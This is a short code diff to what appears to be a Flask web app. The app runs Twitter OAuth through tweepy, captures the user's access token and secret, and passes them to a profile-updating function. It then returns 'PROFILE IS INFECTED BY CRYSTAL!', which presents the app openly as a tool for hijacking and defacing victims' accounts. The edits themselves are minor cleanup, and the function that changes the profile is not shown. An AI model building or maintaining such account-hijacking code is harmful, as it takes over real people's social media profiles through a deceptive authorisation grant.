@@ -87,7 +87,7 @@ def home():
         auth = tweepy.OAuthHandler(API_KEY, API_SECRET, CALLBACK_URL)
         redirect_url = auth.get_authorization_url()
         request_token["oauth_token"] = auth.request_token["oauth_token"]
-        request_token["oauth_token_secret"] = auth.request_token["oauth_token_secret"]
+        request_token["oauth_token_secret"] = auth.request_token["oauth_token_secret"]        
         return redirect(redirect_url)
     except tweepy.TweepError as e:
         print(f"❌ Errore OAuth: {e}")
@@ -112,6 +112,9 @@ def twitter_callback():
         access_token = auth.access_token
         access_secret = auth.access_token_secret
         update_twitter_profile(access_token, access_secret)
+
+        request_token.clear()
+
         return "✅ PROFILE IS INFECTED BY CRYSTAL!"
     except tweepy.TweepError as e:
         print(f"❌ Errore access token: {e}")
@@ -127,6 +130,7 @@ def banner_image():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
+
 
 
 
